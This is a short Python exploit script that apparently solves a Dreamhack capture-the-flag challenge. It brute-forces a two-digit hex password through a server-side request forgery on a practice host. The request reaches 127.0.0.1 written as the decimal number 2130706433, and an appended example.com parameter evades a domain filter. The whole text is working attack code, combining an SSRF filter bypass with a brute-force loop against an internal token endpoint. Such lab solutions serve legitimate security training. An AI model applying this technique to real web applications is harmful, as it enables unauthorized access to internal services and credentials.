import requests

target_url = "http://host8.dreamhack.games:18989"

for i in range(256):
    # Generate Hex Password (00, 01, ... FE, FF)
    hex_pass = f"{i:02X}"

    res = requests.get(url=f"{target_url}/user-page?url=http%3A%2F%2F2130706433%3A5000%2Faccess-token%3Fpassword%3D{hex_pass}%26dummy%3Dexample.com")
    print(f'Tried {hex_pass}')

    if "Nop~ Password Wrong><" not in res.text:
        print(f'Found correct: {hex_pass}')
        print(res.text)
        break